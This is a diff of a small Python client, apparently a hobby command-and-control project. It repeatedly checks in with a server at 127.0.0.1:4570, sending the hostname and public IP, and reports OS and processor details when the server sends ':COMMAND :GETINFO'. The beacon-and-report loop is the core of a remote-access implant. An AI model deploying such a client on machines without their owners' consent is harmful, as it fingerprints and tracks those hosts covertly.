@@ -1,55 +1,55 @@
 import platform
 import socket
 from requests import get
-import time 
-import threading
+import time
 
 ip = '127.0.0.1'
 port = 4570
 
-def server():
-    system_info = platform.uname()
-    NodeName = system_info.node
-    DeviceIP = get('https://api.ipify.org').content.decode('utf8')
-    cow = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    cow.connect((ip, port))
-    ping = (f":CLIENTPING\n{NodeName}\n{DeviceIP}")
-    print(ping)
-    cow.send(ping.encode())
-    while True:
-        global response
-        response = cow.recv(4096).decode()
-
-        if response.startswith(":COMMAND :GETINFO"):
-            print("command recived")
-            break
-
-def PCinfo():
+def send_pcinfo():
     system_info = platform.uname()
     node_name = system_info.node
-    DeviceIP = get('https://api.ipify.org').content.decode('utf8')
+    DeviceIP = get('https://api.ipify.org').text
 
-    System = f"System: {system_info.system}"
-    Release = f"Release: {system_info.release}"
-    Version = f"Version: {system_info.version}"
-    Machine = f"Machine: {system_info.machine}"
-    Processor = f"Processor: {system_info.processor}"
-    CowIP = f"IP: {DeviceIP}"
+    info = [
+        ":PCINFO",
+        node_name,
+        f"System: {system_info.system}",
+        f"Release: {system_info.release}",
+        f"Version: {system_info.version}",
+        f"Machine: {system_info.machine}",
+        f"Processor: {system_info.processor}",
+        f"IP: {DeviceIP}"
+    ]
 
-    cow = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    cow.connect((ip, port))
-    PCinfo = ":PCINFO\n" + node_name + "\n" + "\n".join([System, Release, Version, Machine, Processor,CowIP])
-    cow.send(PCinfo.encode())
-    cow.close()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    s.send("\n".join(info).encode())
+    s.close()
 
-server()
+def main():
+    system_info = platform.uname()
+    node_name = system_info.node
+    DeviceIP = get('https://api.ipify.org').text
 
-#Exmple
-#:PCINFO
-#DESKTOP-K5B43CV
-#System: Windows
-#Release: 10
-#Version: 10.0.19045
-#Machine: AMD64
-#Processor: Intel64 Family 6 Model 165 Stepping 5, GenuineIntel
-#IP: xxx.xx.xxx.xxx
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+
+            ping = f":CLIENTPING\n{node_name}\n{DeviceIP}"
+            s.send(ping.encode())
+            resp = s.recv(4096).decode()
+
+            if resp.startswith(":COMMAND :GETINFO"):
+                print("[+] Got :GETINFO, sending PC info...")
+                send_pcinfo()
+
+            s.close()
+        except Exception as e:
+            print(f"[!] Error: {e}")
+
+        time.sleep(5)
+
+if __name__ == "__main__":
+    main()
